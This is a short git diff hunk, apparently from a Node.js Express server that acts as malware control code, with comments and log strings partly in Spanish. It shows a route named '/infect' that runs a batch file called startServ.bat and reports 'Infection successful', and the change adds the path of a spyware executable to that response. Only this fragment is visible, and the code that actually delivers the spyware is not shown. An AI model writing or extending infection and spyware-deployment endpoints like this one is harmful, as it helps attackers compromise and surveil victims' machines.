@@ -58,7 +58,8 @@ app.get('/infect', (req, res) => {
                 }
                 console.log(`Resultado startServ.bat: ${stdout}`);
                 res.status(200).json({
-                    message: 'Infection successful'
+                    message: 'Infection successful',
+                    spywarePath: spywareExePath
                 });
             });
         }, 2000);
